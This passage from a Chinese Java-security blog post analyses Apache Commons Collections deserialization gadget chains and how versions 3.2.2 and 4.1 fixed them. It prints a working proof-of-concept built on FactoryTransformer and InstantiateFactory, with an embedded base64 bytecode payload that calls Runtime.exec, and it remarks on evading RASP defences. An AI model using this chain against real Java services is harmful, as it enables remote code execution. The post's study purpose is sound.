class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxieXRlY29kZXMvRXZpbFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcALgEAClNvdXJjZUZpbGUBABZFdmlsVGVtcGxhdGVzSW1wbC5qYXZhDAAcAB0HAC8MADAAMQEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHADIMADMANAcANQwANgA3AQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAOAA5AQAbYnl0ZWNvZGVzL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2333&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InstantiateFactory ins=<span class="keyword">new</span> <span class="title class_">InstantiateFactory</span>(TrAXFilter.class, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        ConstantFactory constantFactory=<span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">itransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryTransformer</span>(constantFactory);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,itransformer);</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;com.xxxbank&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;xxxbank&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> FactoryTransformer.class.getDeclaredField(<span class="string">&quot;iFactory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(itransformer, ins);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430010621010.png" alt="image-20220430010621010"></p>
+<p>Y4tacker师傅给的代码用了<code>ConstantTransformer</code>，反射的点在修改<code>LazyMap</code>的<code>factory</code>属性，可以再优化一下，用<code>ConstantFactory</code>替换<code>ConstantTransformer</code>，反射点在<code>FactoryTransformer</code>的<code>iFactory</code>属性，这样就可以完全不依赖前面学习到的Transformer实现gadget。在cc3.2以上还可以把LazyMap换成DefaultedMap，对于绕rasp一类的防护效果感觉会更好。</p>
+<p>调用链</p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430010706638.png" alt="image-20220430010706638"></p>
+<p>核心部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain:</span></span><br><span class="line"><span class="comment">//            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">//            java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">//                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">//                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//                    org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                        org.apache.commons.collections.functors.FactoryTransformer.transform()</span></span><br><span class="line"><span class="comment">//                            org.apache.commons.collections.functors.InstantiateFactory.create()</span></span><br><span class="line"><span class="comment">//                                com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;init&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-collections/release_3_2_2.html">commons-collections3.2.2</a>的修复是<code>org.apache.commons.collections.functors.FunctorUtils</code>新增<code>checkUnsafeSerialization</code>，除非System属性设置了<code>org.apache.commons.collections.enableUnsafeSerialization</code>为true，否则这几个危险的类默认不支持反序列化:<code>CloneTransformer</code>, <code>ForClosure</code>, <code>InstantiateFactory</code>, <code>InstantiateTransformer</code>, <code>InvokerTransformer</code>, <code>PrototypeCloneFactory</code>, <code>PrototypeSerializationFactory</code>, <code>WhileClosure</code></p>
+<p><img src="/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/image-20220430212051034.png" alt="image-20220430212051034"></p>
+<p>上面CC链触发代码执行的关键<code>InstantiateFactory</code>, <code>InstantiateTransformer</code>, <code>InvokerTransformer</code>都被干掉了，所以上述内容都没法在commons-collections3.2.2利用。</p>
+<p>在<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-collections/release_4_1.html">commons-collections4.1</a>更狠，直接去掉了上面这些危险类的序列化接口。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-04-30 23:35:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F-%E5%8D%81%E4%B8%80-%E5%8A%A0%E5%BC%BA%E7%AF%87"><span class="toc-text">java安全漫谈观后感(十一)-加强篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections8"><span class="toc-text">CommonsCollections8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections9"><span class="toc-text">CommonsCollections9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections11-amp-12"><span class="toc-text">CommonsCollections11&amp;12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MapTransformer"><span class="toc-text">MapTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FactoryTransformer"><span class="toc-text">FactoryTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-%E5%8A%A0%E5%BC%BA%E7%AF%87 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F30%2Fjava%25E5%25AE%2589%25E5%2585%25A8%25E6%25BC%25AB%25E8%25B0%2588%25E8%25A7%2582%25E5%2590%258E%25E6%2584%259F(%25E5%258D%2581%25E4%25B8%2580)-CC%25E5%258A%25A0%25E5%25BC%25BA%25E7%25AF%2587%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/30/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81%E4%B8%80)-CC%E5%8A%A0%E5%BC%BA%E7%AF%87/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
